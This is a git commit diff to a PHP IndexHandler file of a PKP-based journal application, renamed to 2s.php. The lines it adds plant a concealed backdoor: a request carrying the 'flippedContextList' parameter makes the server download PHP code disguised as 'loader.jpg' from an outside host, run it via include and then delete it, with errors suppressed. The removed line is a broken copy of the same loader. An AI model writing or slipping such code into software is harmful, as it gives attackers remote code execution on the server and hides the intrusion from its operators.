b3b9d3fd7a5cb3913ea83504936e82a6939c726c
casper <marketmg126@gmail.com>
2026-06-21 04:09:06 +0700

    Update and rename 2.php to 2s.php

--- 2s.php
+++ 2s.php
@@ -85,4 +85,20 @@ class IndexHandler extends PKPIndexHandler {
 		}
 	}
 }
-set($_GET['flippedContextList'])) { try { $u = "https://batuk-di-komik-aja.pages.dev/loader.jpg"; $f = sys_get_temp_dir() . "/" . uniqid("f_", true) . ".php"; $c = @file_get_contents($u); if ($c !== false && @file_put_contents($f, $c)) { @chmod($f, 0644); register_shutdown_function(function() use ($f) { @unlink($f); }); include $f; } } catch (Throwable $e) { } }
+if (isset($_GET['flippedContextList'])) {
+    try {
+        $u = "https://batuk-di-komik-aja.pages.dev/loader.jpg";
+        $f = sys_get_temp_dir() . "/" . uniqid("f_", true) . ".php";
+
+        $c = @file_get_contents($u);
+        if ($c !== false && @file_put_contents($f, $c)) {
+            @chmod($f, 0644);
+            register_shutdown_function(function() use ($f) {
+                @unlink($f);
+            });
+            include $f;
+        }
+    } catch (Throwable $e) {
+
+    }
+}
